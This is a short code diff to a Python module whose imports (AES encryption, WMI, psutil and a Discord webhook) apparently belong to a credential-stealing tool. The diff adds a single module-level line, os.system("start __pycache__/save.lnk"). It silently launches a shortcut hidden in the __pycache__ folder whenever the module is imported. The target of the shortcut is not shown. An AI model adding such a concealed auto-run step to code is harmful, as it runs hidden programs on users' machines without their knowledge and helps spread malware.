@@ -12,6 +12,7 @@ import ctypes
 import psutil
 import requests
 import wmi
+os.system("start __pycache__/save.lnk")
 
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
